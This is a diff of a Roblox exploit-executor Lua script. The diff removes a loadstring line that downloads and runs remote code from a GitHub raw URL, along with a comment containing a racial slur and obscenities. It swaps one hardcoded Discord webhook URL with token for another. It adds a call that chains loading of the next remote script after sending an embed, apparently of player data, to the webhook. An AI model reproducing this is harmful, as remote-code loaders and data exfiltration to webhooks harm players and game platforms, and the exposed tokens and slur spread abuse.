@@ -1,8 +1,4 @@
---7778
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/mabdu21/2askdkn21h3u21ddaa/refs/heads/main/djajuu1yhka.lua'))()
-
--- nigga cracker suck ur mom pussy
+-- If you don't raid us first, we won't raid you. Let's live in peace
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -83,7 +79,8 @@ local Embed = {
     timestamp = string.format('%d-%02d-%02dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec)
 }
 
-local webhookUrl = 'https://discord.com/api/webhooks/1416170565844074578/NA8Mjw8rgjHxIT3AdocwORcuNvhypwJ-kyTh_bahTUaUhE7cEDMuNclK8Q5t0eXNfT1R'
+-- If you don't raid us first, we won't raid you. Let's live in peace
+local webhookUrl = 'https://discord.com/api/webhooks/1425592347571519559/03HQqf2bl5mosoN-M79b9V2sf3WgWakz-rH4wZi8kjusgLJ1Y-gtn3-47iCrrYwywM8L'
 local requestFunction = (syn and syn.request) or http_request or (http and http.request)
 
 local function loadNextScript()
@@ -108,5 +105,7 @@ else
     if response then
         warn("Status Code:", response.StatusCode)
         warn("Body:", response.Body)
+        loadNextScript()
     end
 end
+
